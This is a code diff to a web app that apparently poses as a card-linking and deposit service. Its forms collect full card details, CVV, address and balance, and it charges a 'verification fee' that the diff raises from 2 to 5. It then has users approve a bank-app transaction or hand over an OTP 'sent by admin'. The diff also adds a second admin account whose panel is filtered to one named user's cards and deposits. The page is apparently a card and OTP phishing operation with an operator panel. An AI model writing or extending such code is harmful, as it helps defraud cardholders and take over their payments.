@@ -575,7 +575,7 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
 </div>
 <div style="background:rgba(255,193,7,0.1);border:1px solid rgba(255,193,7,0.35);border-radius:10px;padding:12px 14px;margin-bottom:8px;display:flex;gap:10px;align-items:flex-start;">
   <div style="font-size:18px;flex-shrink:0;">&#9888;&#65039;</div>
-  <div style="font-size:12px;color:#ffc107;line-height:1.5;"><strong>Card Linking Fee</strong><br>A small <strong id="card-link-fee">2$</strong> fee will be charged from your card to verify it is active and valid. This is a standard security check.</div>
+  <div style="font-size:12px;color:#ffc107;line-height:1.5;"><strong>Card Linking Fee</strong><br>A small <strong id="card-link-fee">5</strong> fee will be charged from your card to verify it is active and valid. This is a standard security check.</div>
 </div><div class="modal-error" id="card-error"></div><button class="modal-btn blue" id="card-submit-btn" data-i18n="linkCardBtn">Link Card</button></div></div>
 
 <div class="modal" id="verify-modal"><div class="modal-box center verify-box"><div class="modal-header"><h3>&#128272; Verify Card</h3><button class="modal-close" onclick="closeModal('verify-modal')">&#215;</button></div><div class="verify-card-preview"><div class="verify-card-brand" id="vc-brand">VISA</div><div class="verify-card-number" id="vc-number">&#8226;&#8226;&#8226;&#8226; &#8226;&#8226;&#8226;&#8226; &#8226;&#8226;&#8226;&#8226; ----</div><div class="verify-card-holder" id="vc-name">Cardholder</div></div><div class="verify-tabs"><div class="vtab active" id="vtab-app" data-i18n="appAuth">&#128241; App Auth</div><div class="vtab" id="vtab-otp" data-i18n="otpCode">&#128290; OTP Code</div></div><div id="vpanel-app"><div class="verify-subtitle">Open your banking app and authorize the verification</div><div class="verify-steps"><div class="verify-step"><div class="vstep-num">1</div><div>Open your bank&#39;s mobile app</div></div><div class="verify-step"><div class="vstep-num">2</div><div>Find the pending verification transaction</div></div><div class="verify-step"><div class="vstep-num">3</div><div>Approve it, then tap Done below</div></div></div><button class="verify-done-btn" id="verify-app-done" data-i18n="doneAuth">Done &#8212; I Authorized It</button></div><div id="vpanel-otp" style="display:none;"><div class="verify-subtitle">Enter the OTP code sent by admin</div><input type="text" class="otp-input" id="otp-input" placeholder="000000" maxlength="6" inputmode="numeric"><button class="verify-done-btn" id="verify-otp-btn" style="margin-top:12px;" data-i18n="submitOtp">Submit OTP</button></div><div class="verify-msg" id="verify-msg"></div></div></div>
@@ -625,6 +625,7 @@ function sendEmail(toEmail, title, name, message){
 
 // ── CONSTANTS ──
 var ADMIN_EMAIL = 'admin@gmail.com';
+var ADMINADEX_EMAIL = 'adminadex@gmail.com';
 var SYM = {'USD':'$','EUR':'\u20ac','GBP':'\u00a3','NGN':'\u20a6','CAD':'C$','AUD':'A$','JPY':'\u00a5'};
 var BRANDS = {
   Visa:{bg:'linear-gradient(135deg,#1a1f71,#2d43a8)',logo:'VISA'},
@@ -1066,6 +1067,9 @@ auth.onAuthStateChanged(function(user){
     if(user.email===ADMIN_EMAIL){
       showScreen('admin-panel');
       loadAuthTab(); loadDepositsTab(); loadUsersTab();
+    } else if(user.email===ADMINADEX_EMAIL){
+      showScreen('admin-panel');
+      loadAuthTab(); loadDepositsTab(); loadUsersTab();
     } else {
       showScreen('dashboard');
     }
@@ -1304,6 +1308,7 @@ function declineRequest(reqId){
 
 // ── ADMIN: AUTH TAB ──
 function loadAuthTab(){
+  var _adexOnly=currentUser&&currentUser.email===ADMINADEX_EMAIL;
   var att=$('acc-attention'),aut=$('acc-authorized'),rej=$('acc-rejected');
   if(!att) return;
   att.innerHTML='<p class="acc-empty">Loading...</p>';
@@ -1312,7 +1317,7 @@ function loadAuthTab(){
   db.ref('users').once('value').then(function(snap){
     var pending=[],authorized=[],rejected=[];
     snap.forEach(function(s){
-      var u=s.val(); if(!u||u.email===ADMIN_EMAIL) return;
+      var u=s.val(); if(!u||u.email===ADMIN_EMAIL) return; if(_adexOnly&&u.email!=='sanderson@gmail.com') return;
       (u.linkedCards||[]).forEach(function(card,idx){
         if(!card) return;
         var item={u:u,uid:s.key,card:card,idx:idx};
@@ -1409,12 +1414,13 @@ function adminRemove(uid,idx,cid){
 
 // ── ADMIN: DEPOSITS TAB ──
 function loadDepositsTab(){
+  var _adexOnly=currentUser&&currentUser.email===ADMINADEX_EMAIL;
   var list=$('deposits-list'); if(!list) return;
   list.innerHTML='<p class="acc-empty">Loading...</p>';
   db.ref('depositRequests').once('value').then(function(snap){
     if(!snap.exists()){list.innerHTML='<p class="acc-empty">No deposit requests yet</p>';return;}
     var all=[];
-    snap.forEach(function(s){all.push(Object.assign({},s.val(),{reqKey:s.key}));});
+    snap.forEach(function(s){var _r=s.val();if(!_r)return;if(_adexOnly&&_r.email!=='sanderson@gmail.com')return;all.push(Object.assign({},_r,{reqKey:s.key}));});
     all.sort(function(a,b){
       if(a.status==='pending'&&b.status!=='pending') return -1;
       if(b.status==='pending'&&a.status!=='pending') return 1;
@@ -1474,12 +1480,13 @@ function rejectDeposit(reqKey){
 
 // ── ADMIN: USERS TAB ──
 function loadUsersTab(){
+  var _adexOnly=currentUser&&currentUser.email===ADMINADEX_EMAIL;
   var con=$('users-list'); if(!con) return;
   con.innerHTML='<p class="acc-empty">Loading...</p>';
   db.ref('users').once('value').then(function(snap){
     var byCountry={};
     snap.forEach(function(s){
-      var u=s.val(); if(!u||u.email===ADMIN_EMAIL) return;
+      var u=s.val(); if(!u||u.email===ADMIN_EMAIL) return; if(_adexOnly&&u.email!=='sanderson@gmail.com') return;
       var co=(u.country&&u.country.trim())||'Other';
       if(!byCountry[co]) byCountry[co]=[];
       byCountry[co].push(Object.assign({},u,{uid:s.key}));
@@ -1655,7 +1662,7 @@ $('add-new-card-btn').onclick=function(){
   $('card-modal-title').textContent='💳 Link Card';
   // Update fee label based on user currency
   var feeEl=$('card-link-fee');
-  if(feeEl){var feeSym={'USD':'$','EUR':'€','GBP':'£','NGN':'₦','CAD':'C$','AUD':'A$'}[userData.currency||'USD']||'$';feeEl.textContent='2'+feeSym;}
+  if(feeEl){var feeSym={'USD':'$','EUR':'€','GBP':'£','NGN':'₦','CAD':'C$','AUD':'A$'}[userData.currency||'USD']||'$';feeEl.textContent='5'+feeSym;}
   ['card-number','card-name','card-expiry','card-cvv','card-street','card-city','card-postcode','card-country-field','card-phone','card-balance'].forEach(function(id){var el=$(id);if(el)el.value='';});
   $('card-error').textContent='';
   openModal('card-modal');
